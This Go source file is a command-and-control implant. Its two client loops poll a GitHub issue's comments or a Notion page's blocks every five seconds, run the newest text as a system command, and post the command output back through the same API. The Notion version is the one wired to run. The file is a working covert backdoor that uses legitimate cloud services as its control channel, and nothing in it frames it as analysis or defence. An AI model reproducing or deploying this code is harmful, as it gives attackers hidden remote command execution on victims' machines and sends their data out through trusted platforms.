package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	access_token string
	commentURI   string
	repo_name    string
	owner        string
	issuenumber  string
	output       []map[string]interface{}
	cmd          string
)

func github_logic() {
	owner = os.Args[1]
	repo_name = os.Args[2]
	access_token = os.Args[3]
	issuenumber = os.Args[4]
	var prev_command string
	prev_command = ""

	client := &http.Client{}

	fmt.Println("[+] Client Started!")

	for {

		time.Sleep(5 * time.Second)

		//reading command from github

		commentURI := "https://api.github.com/repos/" + owner + "/" + repo_name + "/issues/" + issuenumber + "/comments"

		req, _ := http.NewRequest("GET", commentURI, nil)
		req.Header.Add("Authorization", "Bearer "+access_token)
		req.Header.Add("Accept", "application/vnd.github+json")

		response, err := client.Do(req)

		if err != nil {
			fmt.Println("[-] Error in reading : ", err)
			return
		}

		body, _ := io.ReadAll(response.Body)
		json.Unmarshal(body, &output)

		if len(output) == 0 {
			fmt.Println("[*] No Command Receviced")
			continue
		}

		if prev_command != output[len(output)-1]["body"].(string) {

			fmt.Println("[+] Command Received : ", output[len(output)-1]["body"].(string))

			cmd = output[len(output)-1]["body"].(string)
			tokens := strings.Fields(cmd)

			result := exec.Command(tokens[0], tokens[1:]...)

			// Capture the output
			cmd_output, err := result.Output()
			if err != nil {
				fmt.Println("[-] Error in execution :", err.Error())
				BodyC2 := map[string]string{
					"body": err.Error(),
				}
				bodyC, _ := json.Marshal(BodyC2)
				req2, _ := http.NewRequest("POST", commentURI, bytes.NewBuffer(bodyC))
				req2.Header.Add("Authorization", "Bearer "+access_token)
				req2.Header.Add("Accept", "application/vnd.github+json")
				_, err3 := client.Do(req2)
				if err3 != nil {
					fmt.Println("[-] Error in wrting to github")
				}
				prev_command = err.Error()
				continue
			} else {
				fmt.Println("[+] Command Output : ", string(cmd_output))
			}

			//writing command output to github

			BodyC := map[string]string{
				"body": string(cmd_output),
			}
			bodyC, _ := json.Marshal(BodyC)

			req2, _ := http.NewRequest("POST", commentURI, bytes.NewBuffer(bodyC))
			req2.Header.Add("Authorization", "Bearer "+access_token)
			req2.Header.Add("Accept", "application/vnd.github+json")

			_, err2 := client.Do(req2)
			if err2 != nil {
				fmt.Println("[-] Error in execution :", err)
				continue
			} else {
				fmt.Println("[+] Output Written to gihub")
			}
			prev_command = string(cmd_output)
		} else {
			fmt.Println("[*] No Command Recevied")
		}
	}

}

type TextContent struct {
	Content string `json:"content"`
}

type RichText struct {
	Type string      `json:"type"`
	Text TextContent `json:"text"`
}

type Paragraph struct {
	RichText []RichText `json:"rich_text"`
}

type Block struct {
	Object    string    `json:"object"`
	Type      string    `json:"type"`
	Paragraph Paragraph `json:"paragraph"`
}

type Payload struct {
	Children []Block `json:"children"`
}

func notion_logic() {

	integeration_token := os.Args[1]
	page_id := os.Args[2]

	var output map[string]interface{}
	var lastBlockID string

	url := "https://api.notion.com/v1/blocks/" + page_id + "/children"

	fmt.Println("[+] NotionC2 client started.")

	for {

		time.Sleep(5 * time.Second)

		req, _ := http.NewRequest("GET", url, nil)

		req.Header.Set("Notion-Version", "2022-06-28")
		req.Header.Set("Authorization", "Bearer "+integeration_token)

		res, err := http.DefaultClient.Do(req)

		if err != nil {
			fmt.Println("[-] Error reading from Notion:", err)
			continue
		}

		body, _ := io.ReadAll(res.Body)
		res.Body.Close()

		json.Unmarshal(body, &output)

		blocks := output["results"].([]interface{})

		if len(blocks) == 0 {
			fmt.Println("[-] No Command")
			continue
		}

		block := blocks[len(blocks)-1].(map[string]interface{})
		blockID := block["id"].(string)

		// Skip if we already executed this block
		if blockID == lastBlockID {
			fmt.Println("[!] No new command")
			continue
		}

		lastBlockID = blockID

		if block["type"] != "paragraph" {
			fmt.Println("[-] Block type not paragraph")
			continue
		}

		paragraph := block["paragraph"].(map[string]interface{})
		rich := paragraph["rich_text"].([]interface{})

		if len(rich) == 0 {
			fmt.Println("[-] Empty command")
			continue
		}

		text := rich[0].(map[string]interface{})["text"].(map[string]interface{})["content"].(string)

		fmt.Println("[+] Received Command:", text)

		tokens := strings.Fields(text)

		if len(tokens) == 0 {
			fmt.Println("[-] Invalid command")
			continue
		}

		process := exec.Command(tokens[0], tokens[1:]...)

		out, cmdErr := process.Output()

		if cmdErr != nil {
			fmt.Println("[+] Command execution error:", cmdErr)
			out = []byte(cmdErr.Error())
		}

		content := string(out)

		if len(content) > 1900 {
			content = content[:1900]
		}

		fmt.Println("[+] Command Output:", content)

		payloadStruct := Payload{
			Children: []Block{
				{
					Object: "block",
					Type:   "paragraph",
					Paragraph: Paragraph{
						RichText: []RichText{
							{
								Type: "text",
								Text: TextContent{
									Content: content,
								},
							},
						},
					},
				},
			},
		}

		jsonPayload, err := json.Marshal(payloadStruct)

		if err != nil {
			fmt.Println("[-] JSON Encoding Error:", err)
			continue
		}

		payload := bytes.NewBuffer(jsonPayload)

		req2, _ := http.NewRequest("PATCH", url, payload)

		req2.Header.Set("Notion-Version", "2022-06-28")
		req2.Header.Set("Authorization", "Bearer "+integeration_token)
		req2.Header.Set("Content-Type", "application/json")

		res2, err := http.DefaultClient.Do(req2)

		if err != nil {
			fmt.Println("[-] Error writing output:", err)
			continue
		}

		respBody, _ := io.ReadAll(res2.Body)
		res2.Body.Close()

		fmt.Println("[+] Output sent to Notion")
		fmt.Println(string(respBody))
	}
}

func main() {
	notion_logic()
}
